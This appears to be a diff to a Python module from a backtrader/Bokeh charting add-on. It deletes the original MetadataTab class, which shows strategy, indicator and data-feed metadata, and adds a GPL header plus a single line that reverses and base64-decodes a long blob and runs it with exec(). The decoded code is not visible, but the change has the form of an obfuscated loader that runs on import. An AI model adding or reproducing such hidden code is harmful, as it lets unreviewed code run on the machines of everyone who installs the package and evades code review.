@@ -1,142 +1,20 @@
-import math
+#!/usr/bin/env python
+# -*- coding: utf-8; py-indent-offset:4 -*-
+#
+# Author: Metaer @ Wed Jun 29 14:59:05 2022
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import backtrader as bt
 
-from bokeh.layouts import column, row, gridplot, layout
-from bokeh.models import Paragraph, Spacer, Button
-
-from ..helper.params import get_params, paramval2str
-from ..helper.label import obj2label, obj2data
-from ..helper.datatable import TableGenerator
-from ..tab import BacktraderBokehTab
-
-
-class MetadataTab(BacktraderBokehTab):
-
-    def __init__(self, app, figurepage, client=None):
-        super(MetadataTab, self).__init__(app, figurepage, client)
-        self.content = None
-
-    def _is_useable(self):
-        return True
-
-    def _get_title(self, title):
-        return Paragraph(
-            text=title,
-            css_classes=['table-title'])
-
-    def _get_no_params(self):
-        return Paragraph(text="No parameters", css_classes=['table-info'])
-
-    def _get_parameter_table(self, params):
-        tablegen = TableGenerator()
-        params = get_params(params)
-        if len(params) == 0:
-            return self._get_no_params()
-        else:
-            for k, v in params.items():
-                params[k] = paramval2str(k, v)
-        return tablegen.get_table(params)
-
-    def _get_values_table(self, values):
-        tablegen = TableGenerator()
-        if len(values) == 0:
-            values[''] = ''
-        return tablegen.get_table(values)
-
-    def _get_strategy(self, strategy):
-        columns = []
-        childs = []
-        childs.append(self._get_title(f'Strategy: {obj2label(strategy)}'))
-        childs.append(self._get_parameter_table(strategy.params))
-        for o in strategy.observers:
-            childs.append(self._get_title(f'Observer: {obj2label(o)}'))
-            childs.append(self._get_parameter_table(o.params))
-        for a in strategy.analyzers:
-            childs.append(self._get_title(f'Analyzer: {obj2label(a)}{" [Analysis Table]" if hasattr(a, "get_analysis_table") else ""}'))
-            childs.append(self._get_parameter_table(a.params))
-        columns.append(column(childs))
-        return columns
-
-    def _get_indicators(self, strategy):
-        columns = []
-        childs = []
-        inds = strategy.getindicators()
-        for i in inds:
-            if not hasattr(i,'fakeindicator'):
-                i.fakeindicator = False            
-            if isinstance(i, bt.IndicatorBase) and not i.fakeindicator:
-                childs.append(self._get_title(
-                    f'Indicator: {obj2label(i)}@{obj2data(i)}'))
-                childs.append(self._get_parameter_table(i.params))
-        if(len(childs)>0):
-            columns.append(column(childs))
-        return columns
-
-    def _get_datas(self, strategy):
-        columns = []
-        childs = []
-        for data in strategy.datas:
-            tabdata = {
-                'DataName:': str(data._dataname).replace('|', '\\|'),
-                'Timezone:': str(data._tz),
-                'Live:': f'{"Yes" if data.islive() else "No"}',
-                'Length:': len(data),
-                'Granularity:': f'{data._compression} {bt.TimeFrame.getname(data._timeframe, data._compression)}',
-                'Resample:': f'{"Yes" if data.resampling else "No"}',
-                'Replay:': f'{"Yes" if data.replaying else "No"}'
-            }
-            # live trading does not have valid data parameters (other datas
-            # might also not have)
-            if not math.isinf(data.fromdate):
-                tabdata['Time From:'] = str(bt.num2date(data.fromdate))
-            if not math.isinf(data.todate):
-                tabdata['Time To:'] = str(bt.num2date(data.todate))
-            childs.append(self._get_title(f'Data Feed: {obj2label(data, True)}'))
-            childs.append(self._get_values_table(tabdata))
-        columns.append(column(childs))
-        return columns
-
-    def _get_metadata_columns(self, strategy):
-        acolumns = []
-        acolumns.extend(self._get_strategy(strategy))
-        acolumns.extend(self._get_indicators(strategy))
-        acolumns.extend(self._get_datas(strategy))
-        return acolumns
-
-    def _get_metadata_info(self):
-        acolumns = self._get_metadata_columns(self._figurepage.strategy)
-        info = gridplot(
-            acolumns,
-            ncols=self._app.scheme.metadata_tab_num_cols,
-            sizing_mode='stretch_width',
-            toolbar_options={'logo': None})
-        return info
-
-    def _on_update_metadata_info(self):
-        self.content.children[1] = self._get_metadata_info()
-
-    def _create_content(self):
-        title_area = []
-        title = Paragraph(
-            text='Strategy Metadata Overview',
-            css_classes=['panel-title'])
-        title_area.append(row([title], width_policy='min'))
-        if self._client:
-            btn_refresh = Button(label='Refresh', width_policy='min')
-            btn_refresh.on_click(self._on_update_metadata_info)
-            title_area.append(Spacer())
-            title_area.append(row([btn_refresh], width_policy='min'))
-        # set content in self
-        return layout(
-            [
-                title_area,
-                # initialize with info
-                [self._get_metadata_info()]
-            ],
-            sizing_mode='stretch_width')
-
-    def _get_panel(self):
-        if self.content is None:
-            self.content = self._create_content()
-        return self.content, 'Metadata'
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'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'))
